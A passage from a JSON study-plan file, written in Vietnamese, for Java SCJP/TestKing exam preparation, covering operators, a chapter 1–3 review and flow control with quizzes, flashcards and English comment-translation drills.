              "ans": "In ra: 255. Giải thích: `-1` trong biểu diễn nhị phân 32-bit là toàn bit 1 (`0xFFFFFFFF`). Phép dịch phải không dấu `>>> 24` đẩy 24 bit sang phải và chèn 24 bit 0 từ bên trái, kết quả còn lại 8 bit 1 cuối (`0x000000FF`), tương đương giá trị 255."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_5_1",
          "q": "Xét biểu thức: `int result = 10 + 5 * 2;` và `boolean b = true || false && false;` Giá trị của result và b là:",
          "options": [
            "result = 20, b = true",
            "result = 30, b = false",
            "result = 20, b = false",
            "result = 30, b = true"
          ],
          "correct": 0,
          "exp": "Nhân chia có độ ưu tiên cao hơn cộng trừ (5 * 2 = 10 -> 10 + 10 = 20). Toán tử && có độ ưu tiên cao hơn ||, tuy nhiên vì vế trái của || là true nên đoản mạch trả về true ngay lập tức."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Sự khác biệt giữa toán tử ngắn mạch (`&&`, `||`) và toán tử bitwise (`&`, `|`) khi dùng với boolean?",
          "a": "- `&&` và `||` có tính Short-Circuit: Nếu vế trái đã quyết định kết quả (false với `&&`, true với `||`), vế phải sẽ KHÔNG ĐƯỢC TÍNH TOÁN.\n- `&` và `|` luôn luôn bắt buộc tính toán cả hai vế.",
          "trap": "Bẫy đề thi: `if (x > 5 && ++y > 2)` nếu `x <= 5` thì `y` không tăng giá trị, gây sai lệch kết quả tracing."
        },
        {
          "q": "Toán tử gán kết hợp (`+=`, `-=`, `*=`) có điểm gì đặc biệt so với phép gán thông thường?",
          "a": "Toán tử gán kết hợp tự động ép kiểu ngầm định (implicit cast). Ví dụ: `byte b = 10; b += 5;` tương đương `b = (byte)(b + 5);` nên compile được; trong khi `b = b + 5;` bị Compile Error do 5 là int.",
          "trap": "Nhầm tưởng `b += 5` và `b = b + 5` hoàn toàn giống nhau."
        },
        {
          "q": "Độ ưu tiên giữa toán tử tiền tố (`++x`) và hậu tố (`x++`) trong một biểu thức phức tạp?",
          "a": "`++x` tăng giá trị ngay trước khi lấy giá trị vào biểu thức; `x++` lấy giá trị hiện tại vào biểu thức trước rồi mới tăng biến sau.",
          "trap": "Biểu thức `int x = 1; x = x++;` kết quả `x` vẫn là 1 vì giá trị cũ (1) được gán đè lại sau khi tăng!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        },
        {
          "id": 14,
          "vi": "(Duyệt qua các ngày của tháng)",
          "en": "Iterate days of the month"
        },
        {
          "id": 15,
          "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
          "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
        },
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        },
        {
          "id": 17,
          "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
          "en": "Export data of all months of current year on screen"
        }
      ],
      "chapter": "Chapter 3: Operators & Assignments"
    },
    "6": {
      "day": 6,
      "week": 1,
      "title": "Luyện đề TestKing Chapter 1-3",
      "topics": [
        "Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3",
        "Tư duy đọc code truy tìm Compile Error"
      ],
      "tasks": [
        "Làm 40-50 câu TestKing Ch1-3 không nhìn đáp án",
        "Chấm điểm và phân tích câu sai vào Error Book",
        "Luyện 5 câu dịch Comment Code"
      ],
      "englishDrill": [
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        },
        {
          "id": 17,
          "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
          "en": "Export data of all months of current year on screen"
        },
        {
          "id": 18,
          "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
          "en": "Export all data of days off in database"
        },
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        },
        {
          "id": 20,
          "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
          "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
        }
      ],
      "summary": "Luyện đề tổng hợp Chapter 1-3: Phản xạ phát hiện lỗi biên dịch và tính toán biểu thức.",
      "coreTheory": "\n### Chiến thuật làm đề TestKing Ch1-Ch3:\n1. Đọc code từ trên xuống, kiểm tra chữ ký class, package, import.\n2. Soát kỹ các Access Modifier: class con có thu hẹp quyền không? biến interface có bị gán lại không?\n3. Tìm các biến cục bộ (local variable) xem có dòng nào dùng khi chưa khởi tạo không.\n4. Lần vết từng bước (code tracing) với các toán tử `++`, `--`, `&&`, `||`.\n5. Chú ý các kiểu dữ liệu ép kiểu ngầm định (numeric promotion).\n",
      "codeSnippet": "public class Ch1to3Review {\n    public static void main(String[] args) {\n        byte b = 10;\n        b += 5; // OK (tự ép kiểu)\n        // b = b + 5; // COMPILE ERROR!\n        System.out.println(\"b = \" + b);\n    }\n}",
      "traps": [
        "Toán tử gán kết hợp (+=) tự động ép kiểu, còn phép toán thông thường (+) thì không.",
        "Indent/format code thụt thò cố tình đánh lừa mắt nhìn."
      ],
      "quickQuiz": [
        {
          "q": "Trong biểu thức `byte b = 10; b += 5;`, tại sao `b += 5` hợp lệ còn `b = b + 5` bị lỗi biên dịch?",
          "a": "Toán tử gộp `+=` tự động chèn ép kiểu ngầm định: `b = (byte)(b + 5)`. Trong khi `b + 5` thực hiện numeric promotion biến thành `int`, gán lại cho `byte` sẽ gây Compile Error do mất dữ liệu."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3, Tư duy đọc code truy tìm Compile Error.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Chiến thuật làm đề TestKing Ch1-Ch3:\n1. Đọc code từ trên xuống, kiểm tra chữ ký class, package, import.\n2. Soát kỹ các Access Modifier: class con có thu hẹp quyền không? biến interface có bị gán lại không?\n3. Tìm các biến cục bộ (local variable) xem có dòng nào dùng khi chưa khởi tạo không.\n4. Lần vết từng bước (code tracing) với các toán tử `++`, `--`, `&&`, `||`.\n5. Chú ý các kiểu dữ liệu ép kiểu ngầm định (numeric promotion).\n",
          "code": "public class Ch1to3Review {\n    public static void main(String[] args) {\n        byte b = 10;\n        b += 5; // OK (tự ép kiểu)\n        // b = b + 5; // COMPILE ERROR!\n        System.out.println(\"b = \" + b);\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d6_1",
          "level": "Hard",
          "question": "Dự đoán kết quả in ra của đoạn code TestKing tổng hợp cú pháp sau:",
          "code": "public class TestKingTrap1 {\n    public static void main(String[] args) {\n        int x = 5;\n        boolean b1 = true;\n        boolean b2 = false;\n        if ((x == 4) && !b2)\n            System.out.print(\"1 \");\n        System.out.print(\"2 \");\n        if ((b2 = true) && b1)\n            System.out.print(\"3 \");\n    }\n}",
          "options": [
            "2 3 ",
            "1 2 3 ",
            "2 ",
            "Compile Error tại dòng (b2 = true)"
          ],
          "correctIndex": 0,
          "explanation": "1. `(x == 4)` là false, toán tử ngắn mạch `&&` dừng lại, câu lệnh `System.out.print(\"1 \");` bị bỏ qua.\n2. Do không có dấu ngoặc nhọn `{}`, chỉ câu lệnh in '1 ' thuộc if. Câu lệnh in `2 ` nằm ngoài if nên luôn luôn được thực thi!\n3. Biểu thức `(b2 = true)` là phép GÁN (assignment) gán b2 thành true và trả về true. `true && b1` là true nên in tiếp `3 `.\nKết quả in ra: `2 3 `."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Toán tử gán kết hợp (+=) tự động ép kiểu, còn phép toán thông thường (+) thì không.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "public class Ch1to3Review {\n    public static void main(String[] args) {\n        byte b = 10;\n        b += 5; // OK (tự ép kiểu)\n        // b = b + 5; // COMPILE ERROR!\n        System.out.println(\"b = \" + b);\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Indent/format code thụt thò cố tình đánh lừa mắt nhìn.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "public class Ch1to3Review {\n    public static void main(String[] args) {\n        byte b = 10;\n        b += 5; // OK (tự ép kiểu)\n        // b = b + 5; // COMPILE ERROR!\n        System.out.println(\"b = \" + b);\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Tổng hợp bẫy cú pháp Ch1-3",
          "questions": [
            {
              "q": "Trong các định danh sau, định danh nào KHÔNG hợp lệ: `_myVar`, `$value`, `2ndCount`, `int`?",
              "ans": "`2ndCount` (bắt đầu bằng chữ số) và `int` (trùng từ khóa dành riêng của Java)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cơ chế gán giá trị mặc định",
          "questions": [
            {
              "q": "Khi khai báo `boolean[] flags = new boolean[3];`, các phần tử có giá trị là gì?",
              "ans": "Mọi phần tử mảng boolean được khởi tạo mặc định là `false`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace bẫy ép kiểu biến cục bộ",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint x = 100;\nbyte b = (byte) x;\nx = b + 10;\nSystem.out.println(x);\n```\nKết quả in ra là gì?",
              "ans": "In ra: 110. Giải thích: `b` ép kiểu từ 100 vẫn giữ nguyên 100 (vì 100 nằm trong khoảng -128..127 của byte). Phép cộng `b + 10` sinh ra `int` giá trị 110, gán hợp lệ cho biến `int x`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy biến cục bộ chưa khởi tạo",
          "questions": [
            {
              "q": "Đoạn code sau có lỗi gì?\n```java\nint x;\nif (args.length > 0) {\n    x = 10;\n}\nSystem.out.println(x);\n```",
              "ans": "Compile Error: `variable x might not have been initialized`. Trình biên dịch nhận thấy khối if có thể không được thỏa mãn nếu không truyền đối số, dẫn tới `x` chưa được khởi tạo trước khi in."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Chuyển đổi kiểu dữ liệu char và int",
          "questions": [
            {
              "q": "Biểu thức `char c = 'A'; int i = c + 1; System.out.println((char)i);` in ra gì?",
              "ans": "In ra: `'B'`. Mã ASCII của 'A' là 65. `c + 1` thực hiện numeric promotion thành `int` giá trị 66. Ép kiểu `(char)66` trả về ký tự tương ứng là 'B'."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_6_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3 phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3."
        },
        {
          "id": "da_6_2",
          "q": "Khi thao tác với Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Số nguyên bắt đầu bằng số 0 (vd `012`, `08`) trong Java có quy tắc gì?",
          "a": "Số bắt đầu bằng `0` là hệ Bát phân (Octal, cơ số 8), chỉ chấp nhận các chữ số từ `0` đến `7`. `012` = 1*8 + 2 = 10 thập phân. Khai báo `08` hoặc `09` bị Compile Error ngay!",
          "trap": "Chữ số 8 và 9 trong số nguyên bắt đầu bằng 0 là bẫy kinh điển số 1 của TestKing."
        },
        {
          "q": "Tại sao `float f = 3.14;` bị lỗi biên dịch và cách sửa chuẩn?",
          "a": "Số thực có dấu chấm thập phân mặc định là kiểu `double` (64-bit). Gán `double` sang `float` (32-bit) là Narrowing conversion nên lỗi. Sửa bằng cách thêm hậu tố `F`/`f`: `float f = 3.14f;` hoặc ép kiểu `(float)3.14`.",
          "trap": "Rất nhiều người nhầm số thập phân mặc định là float."
        },
        {
          "q": "Biến local trong method có được tự động gán giá trị mặc định (default value) không?",
          "a": "KHÔNG. Biến cục bộ (local variable) không có giá trị mặc định. Nếu cố tình đọc/sử dụng khi chưa được khởi tạo giá trị, trình biên dịch sẽ báo lỗi Compile Error.",
          "trap": "Chỉ có instance variable (biến trong object) và static variable mới nhận default value (0, false, null)."
        }
      ],
      "dailyEnglish": [
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        },
        {
          "id": 17,
          "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
          "en": "Export data of all months of current year on screen"
        },
        {
          "id": 18,
          "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
          "en": "Export all data of days off in database"
        },
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        },
        {
          "id": 20,
          "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
          "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
        }
      ]
    },
    "7": {
      "day": 7,
      "week": 1,
      "title": "REVIEW DAY 1: Tổng kết & Lập Top 20 Lỗi Tuần 1",
      "topics": [
        "Ôn tập toàn diện Ch1, Ch2, Ch3",
        "Truy tìm lỗ hổng kiến thức"
      ],
      "tasks": [
        "Làm lại 20 câu Ch1, 20 câu Ch2, 20 câu Ch3",
        "Lập danh sách TOP 20 lỗi hay mắc",
        "Đánh giá tiến độ tuần 1"
      ],
      "englishDrill": [
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        },
        {
          "id": 20,
          "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
          "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
        },
        {
          "id": 21,
          "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
          "en": "check existion of data from database"
        },
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        },
        {
          "id": 23,
          "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
          "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
        }
      ],
      "summary": "REVIEW DAY TUẦN 1: Thiết lập Top 20 lỗi sai và lấp toàn bộ lỗ hổng kiến thức Ch1-3.",
      "coreTheory": "\n### Top 5 lỗi kinh điển Tuần 1 cần khắc cốt ghi tâm:\n1. **Local variable không có default value:** Sử dụng khi chưa gán $\\rightarrow$ Compile Error.\n2. **Numeric Promotion:** Phép toán `byte + byte` sinh ra kiểu `int`.\n3. **Octal Literal:** Số có tiền tố `0` là hệ bát phân (ví dụ `08` là sai cú pháp).\n4. **Interface variables:** Mặc định là `public static final`.\n5. **Short-circuit evaluation:** Vế phải của `&&` không chạy khi vế trái `false`.\n",
      "codeSnippet": "// Ôn tập lại 5 bẫy lớn nhất tuần 1\nint x;\n// System.out.println(x); // 1. Lỗi!\nbyte a = 1, b = 2;\n// byte c = a + b; // 2. Lỗi!\nbyte c = (byte)(a + b); // Đúng",
      "traps": [
        "Không bao giờ học thuộc đáp án TestKing A/B/C/D, phải giải thích được tại sao sai."
      ],
      "quickQuiz": [
        {
          "q": "Một class con ở package khác có thể truy cập thành viên `protected` của class cha thông qua tham chiếu của class cha (`Parent p = new Parent(); p.field`) được không?",
          "a": "Không! Class con chỉ có thể truy cập thành viên `protected` thông qua tính kế thừa (`this.field` hoặc `super.field`), hoặc thông qua tham chiếu của chính class con đó (`Child c = new Child(); c.field`)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Ôn tập toàn diện Ch1, Ch2, Ch3, Truy tìm lỗ hổng kiến thức.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Top 5 lỗi kinh điển Tuần 1 cần khắc cốt ghi tâm:\n1. **Local variable không có default value:** Sử dụng khi chưa gán $\\rightarrow$ Compile Error.\n2. **Numeric Promotion:** Phép toán `byte + byte` sinh ra kiểu `int`.\n3. **Octal Literal:** Số có tiền tố `0` là hệ bát phân (ví dụ `08` là sai cú pháp).\n4. **Interface variables:** Mặc định là `public static final`.\n5. **Short-circuit evaluation:** Vế phải của `&&` không chạy khi vế trái `false`.\n",
          "code": "// Ôn tập lại 5 bẫy lớn nhất tuần 1\nint x;\n// System.out.println(x); // 1. Lỗi!\nbyte a = 1, b = 2;\n// byte c = a + b; // 2. Lỗi!\nbyte c = (byte)(a + b); // Đúng"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_7_1",
          "level": "Easy",
          "question": "Đã điền đầy đủ bảng Access Modifiers Matrix vào Sổ Lỗi chưa?",
          "code": "// Ôn tập lại 5 bẫy lớn nhất tuần 1\nint x;\n// System.out.println(x); // 1. Lỗi!\nbyte a = 1, b = 2;\n// byte c = a + b; // 2. Lỗi!\nbyte c = (byte)(a + b); // Đúng",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Bắt buộc phải thuộc lòng 4 mức public, protected, default, private."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Không bao giờ học thuộc đáp án TestKing A/B/C/D, phải giải thích được tại sao sai.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Ôn tập lại 5 bẫy lớn nhất tuần 1\nint x;\n// System.out.println(x); // 1. Lỗi!\nbyte a = 1, b = 2;\n// byte c = a + b; // 2. Lỗi!\nbyte c = (byte)(a + b); // Đúng",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Ma trận Access Modifiers",
          "questions": [
            {
              "q": "Thứ tự từ chặt chẽ nhất đến mở rộng nhất của 4 mức Access Modifiers trong Java là gì?",
              "ans": "`private` -> `default (package-private)` -> `protected` -> `public`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cơ chế truy cập protected ngoài package",
          "questions": [
            {
              "q": "Class con ở package khác có thể gọi phương thức `protected` của class cha bằng cách nào?",
              "ans": "Chỉ thông qua quan hệ kế thừa (dùng `this.method()` hoặc `super.method()`), không thể truy cập thông qua tham chiếu của instance lớp cha (`new Parent().method()`)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace toán tử điều kiện ba ngôi lồng nhau",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint x = 5;\nint y = 10;\nint z = (x > 3) ? (y < 8 ? 1 : 2) : 3;\nSystem.out.println(z);\n```\nKết quả in ra là gì?",
              "ans": "In ra: 2. Giải thích: `x > 3` (5 > 3) là `true`, đánh giá nhánh thứ nhất: `(y < 8 ? 1 : 2)`. Vì `y < 8` (10 < 8) là `false`, kết quả nhánh này là 2. Biến `z` nhận giá trị 2."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy gán trong biểu thức điều kiện",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nboolean b = false;\nif (b = true) {\n    System.out.println(\"TRUE\");\n} else {\n    System.out.println(\"FALSE\");\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `TRUE`. Đây là bẫy toán tử gán `=` thay vì so sánh `==`. Biểu thức `b = true` gán `true` cho `b` và đồng thời trả về giá trị `true`, làm cho khối if được thỏa mãn!"
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Toán tử XOR ^ trên bit và boolean",
          "questions": [
            {
              "q": "Kết quả của `true ^ false` và `5 ^ 3` là bao nhiêu?",
              "ans": "`true ^ false` = `true` (XOR logic: trả về true khi 2 toán hạng khác nhau). `5 ^ 3` = `6` (XOR bitwise: 0101 ^ 0011 = 0110, tương đương số 6)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_7_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Ôn tập toàn diện Ch1, Ch2, Ch3?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Ôn tập toàn diện Ch1, Ch2, Ch3 phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Ôn tập toàn diện Ch1, Ch2, Ch3."
        },
        {
          "id": "da_7_2",
          "q": "Khi thao tác với Ôn tập toàn diện Ch1, Ch2, Ch3, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Quy tắc mở rộng kiểu (Widening primitive conversion) tự động trong Java theo thứ tự nào?",
          "a": "`byte` -> `short` -> `int` -> `long` -> `float` -> `double`. Riêng `char` (không dấu, 0..65535) có thể mở rộng sang `int`, nhưng không thể gán tự động từ `byte` sang `char`.",
          "trap": "Gán `byte b = 1; char c = b;` là Compile Error vì byte có dấu còn char không dấu!"
        },
        {
          "q": "Array Covariance (tính đồng biến của mảng) là gì và tiềm ẩn lỗi gì ở runtime?",
          "a": "Nếu `Sub` kế thừa `Super`, thì `Sub[]` là kiểu con của `Super[]`. Cho phép gán `Object[] arr = new String[3];`. Tuy nhiên, nếu cố tình gán `arr[0] = 123;` thì lúc chạy sẽ ném `ArrayStoreException`.",
          "trap": "Biên dịch không báo lỗi nhưng chạy sẽ ném ArrayStoreException."
        },
        {
          "q": "Hậu tố `L`, `F`, `D` trong literal số có phân biệt hoa thường không?",
          "a": "Không phân biệt hoa thường (`100l` hay `100L`, `3.14f` hay `3.14F`). Tuy nhiên khuyến nghị dùng chữ hoa `L` để tránh nhầm chữ `l` với số `1`.",
          "trap": "TestKing hay in `100l` khiến thí sinh nhìn nhầm thành `1001`."
        }
      ],
      "dailyEnglish": [
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        },
        {
          "id": 20,
          "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
          "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
        },
        {
          "id": 21,
          "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
          "en": "check existion of data from database"
        },
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        },
        {
          "id": 23,
          "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
          "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
        }
      ]
    },
    "8": {
      "day": 8,
      "week": 2,
      "title": "Chapter 4: Flow Control (if, switch, loops)",
      "topics": [
        "if / else (bẫy else treo)",
        "switch statement: kiểu dữ liệu hợp lệ (byte, short, char, int), bẫy fall-through khi thiếu break",
        "for, while, do-while loops",
        "break & continue có label vs không label"
      ],
      "tasks": [
        "Code tracing từng bước i, condition, statement",
        "Làm bài tập switch case thiếu break"
      ],
      "englishDrill": [
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        },
        {
          "id": 23,
          "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
          "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
        },
        {
          "id": 24,
          "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
          "en": "Get list from table ABC by inputted conditions"
        },
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        },
        {
          "id": 26,
          "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
          "en": "Do not input space at the beginning of string"
        }
      ],
      "summary": "Chapter 4: Flow Control (if, switch, for, while, do-while, break, continue).",
      "coreTheory": "\n### 1. if / else & Bẫy 'Dangling Else'\n- Trong Java, `else` luôn luôn thuộc về `if` gần nhất phía trước nó nếu không có dấu ngoặc nhọn `{}`.\n\n### 2. switch statement & Fall-through\n- Kiểu dữ liệu hợp lệ: `byte`, `short`, `char`, `int`, `enum`, `String` (từ Java 7). **CẤM: `long`, `float`, `double`, `boolean`**.\n- Nếu case không có `break`, JVM sẽ tiếp tục thực thi các case tiếp theo bất kể điều kiện (Fall-through).\n\n### 3. Loops (for, while, do-while)\n- `do-while` luôn thực thi thân vòng lặp ít nhất 1 lần trước khi kiểm tra điều kiện.\n- `break` và `continue` có thể dùng kèm nhãn (Labeled break/continue) để thoát khỏi vòng lặp lồng nhau.\n",
      "codeSnippet": "int num = 2;\nswitch (num) {\n    case 1: System.out.print(\"1 \");\n    case 2: System.out.print(\"2 \");\n    case 3: System.out.print(\"3 \");\n    default: System.out.print(\"D \");\n}\n// In ra: 2 3 D (Fall-through vì thiếu break!)",
      "traps": [
        "switch trên biến kiểu long hoặc float bị Compile Error.",
        "Vòng lặp `for(;;)` là vòng lặp vô tận hợp lệ."
      ],
      "quickQuiz": [
        {
          "q": "switch có thể nhận kiểu double không?",
          "a": "Không, Compile Error ngay lập tức!"
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm SCJP & TestKing)",
